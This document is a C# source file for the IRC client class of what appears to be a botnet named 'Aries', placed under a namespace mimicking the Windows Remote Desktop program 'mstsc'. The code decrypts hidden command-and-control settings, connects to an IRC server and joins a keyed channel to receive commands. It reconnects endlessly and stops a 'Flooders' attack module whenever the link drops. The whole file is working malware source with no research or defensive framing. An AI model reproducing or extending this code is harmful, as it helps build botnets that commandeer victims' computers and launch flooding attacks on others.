using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using Microsoft.VisualBasic;
using mstsc.Aries.Antis;

namespace mstsc.IRC
{
    sealed class Client
    {
        public enum Type : int
        {
            Server = 1,
            ServerPass = 2,
            Port = 3,
            Channel = 4,
            ChannelPass = 5,
            Master = 6,
            AuthHost = 8,
            LoginPass = 9
        }

        public static string IRCVars(Type type)
        {
            SimpleAES aesAll = new SimpleAES();
            return aesAll.Decrypt(Encoding.Default.GetBytes(Strings.Split(Config.IRCSettings[(int)type], Config.FSplit4, -1, CompareMethod.Text)[0]));
        }

        public TcpClient TCPStream;
        public StreamReader Reader;
        public StreamWriter Writer;
        public Stream Stream;
        public delegate void OnMessageEventHandler(object sender, OnMessageEventArgs e);
        public event OnMessageEventHandler OnMessageEvent;

        private string _LastMessage;
        private string _Nick;
        private string _User;

        public string LastMessage
        {
            get
            {
                return _LastMessage;
            }
            set
            {
                _LastMessage = value;
                if (value.Contains("PRIVMSG"))
                {
                    OnMessageEvent.Invoke(this, new OnMessageEventArgs(value, new Sender(value.Split(':')[1].Split('!')[0], value.Split(':')[1].Split('@')[1].Split(' ')[0])));
                }
            }
        }
        public string Nick
        {
            get
            {
                return _Nick;
            }
            set
            {
                _Nick = value;
            }
        }
        public string User
        {
            get
            {
                return _User;
            }
            set
            {
                _User = value;
            }
        }


        /// <summary>
        /// Constructor
        /// </summary>
        public Client(string Server, string ServerPass, int Port, string Master, string Channel, string ChannelPass, string Nick)
        {
            this.Nick = Nick;
            string rand = new Random().Next(200).ToString();
            User = rand + " " + rand + " " + rand + " :" + rand;
            //username hostname servername :realname
        }

        public void Connect()
        {
            TCPStream = new TcpClient();
            try
            {
                TCPStream.Connect(IRCVars(Type.Server), Int32.Parse(IRCVars(Type.Port)));
            }
            catch (SocketException)//ex)
            {
                Aries.Config.LoggedIn = false;
                /*System.Windows.Forms.MessageBox.Show("1");
                System.Windows.Forms.MessageBox.Show(ex.Message + "\n\n\n" + ex.ErrorCode.ToString());
                System.Windows.Forms.MessageBox.Show(ex.NativeErrorCode.ToString() + "\n\n\n" + ex.SocketErrorCode.ToString());*/

                new Aries.Commands.Flooders.StopFlood();
                System.Threading.Thread.Sleep(180000); //3 mins 
                GC.Collect();
                Connect();
                return;
            }
            Stream = TCPStream.GetStream();
            Reader = new StreamReader(Stream);
            Writer = new StreamWriter(Stream);
            Writer.AutoFlush = true;

            if (IRCVars(Type.ServerPass) != "")
            {
                SendServerPass(IRCVars(Type.ServerPass));
            }
            SendUser(User);
            ChangeNick(Nick);

            //Ready to chat!
            string Line;
            try
            {
                while (true)
                {
                    while ((Line = Reader.ReadLine()) != "")
                    {
                        LastMessage = Line;
                        if (Line.Contains("End of /MOTD command") || Line.Contains("MOTD File is missing"))
                        {
                            JoinChannel(IRCVars(Type.Channel), IRCVars(Type.ChannelPass));
                        }
                        if (Line.Contains("PING :"))
                        {
                            Writer.WriteLine("PONG :" + Line.Substring(Line.IndexOf("PING :") + 6));
                        }
                    }
                }
            }
            catch
            {
                Aries.Config.LoggedIn = false;
                //System.Windows.Forms.MessageBox.Show("2");
                //System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message);

                new Aries.Commands.Flooders.StopFlood();
                System.Threading.Thread.Sleep(180000); //3 mins
                GC.Collect();
                Connect();
                return;
            }
        }

        public void SendUser(string User)
        {
            Writer.WriteLine("USER " + User);
        }

        public void SendServerPass(string Pass)
        {
            Writer.WriteLine("PASS " + Pass);
        }

        public void ChangeNick(string Nick)
        {
            Writer.WriteLine("NICK " + Nick);
        }

        public void JoinChannel(string Channel)
        {
            Writer.WriteLine("JOIN " + Channel);
        }

        public void JoinChannel(string Channel, string Key)
        {
            Writer.WriteLine("JOIN " + Channel + " " + Key);
        }

        public void MessageChannel(string Channel, string Message)
        {
            Writer.WriteLine("PRIVMSG " + Channel + " :" + Message);
        }

        public void MessageCurrentChannel(string Message)
        {
            MessageChannel(IRCVars(Type.Channel), Message);
        }

        public void Quit(string Message)
        {
            Writer.WriteLine("QUIT :" + Message);
        }
    }
}
